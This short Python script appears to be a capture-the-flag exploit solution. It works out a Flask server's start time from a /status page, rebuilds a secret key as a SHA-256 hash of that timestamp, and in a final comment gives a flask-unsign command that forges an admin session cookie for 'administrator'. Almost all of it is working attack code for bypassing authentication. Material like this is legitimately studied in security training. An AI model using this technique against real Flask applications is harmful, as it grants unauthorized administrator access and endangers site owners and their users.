import hashlib

#go to /status
#servertime          -    uptime  
#2024-09-21 08:53:24 - 00:03:10 = 2024-09-21 08:50:14
#server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
server_start_str = ''
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
print(secure_key)

# then 
#flask-unsign --sign --cookie "{'is_admin': True, 'username': 'administrator'}" --secret <secure_key>